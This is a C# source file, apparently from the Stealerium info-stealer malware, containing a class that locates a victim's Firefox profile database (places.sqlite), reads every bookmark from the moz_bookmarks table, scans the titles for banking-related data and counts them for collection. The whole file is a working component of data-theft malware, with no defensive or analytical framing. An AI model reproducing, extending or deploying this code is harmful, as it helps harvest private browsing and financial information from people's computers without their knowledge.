using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;
using Stealerium.Target.Browsers.Chromium;

namespace Stealerium.Target.Browsers.Firefox;

internal class CBookmarks
{
	private static string GetBookmarksDbPath(string path)
	{
		try
		{
			string path2 = path + "\\Profiles";
			if (Directory.Exists(path2))
			{
				string[] directories = Directory.GetDirectories(path2);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\places.sqlite"))
					{
						return text + "\\places.sqlite";
					}
				}
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Firefox >> Failed to find bookmarks\n" + ex);
		}
		return null;
	}

	public static List<Bookmark> Get(string path)
	{
		List<Bookmark> list = new List<Bookmark>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(GetBookmarksDbPath(path), "moz_bookmarks");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				Bookmark bookmark = default(Bookmark);
				bookmark.Title = Crypto.GetUtf8(sqLite.GetValue(i, 5));
				Bookmark item = bookmark;
				if (Crypto.GetUtf8(sqLite.GetValue(i, 1)).Equals("0") && !(item.Title == "0"))
				{
					Banking.ScanData(item.Title);
					Counter.Bookmarks++;
					list.Add(item);
				}
			}
			return list;
		}
		catch (Exception ex)
		{
			Logging.Log("Firefox >> bookmarks collection failed\n" + ex);
			return list;
		}
	}
}
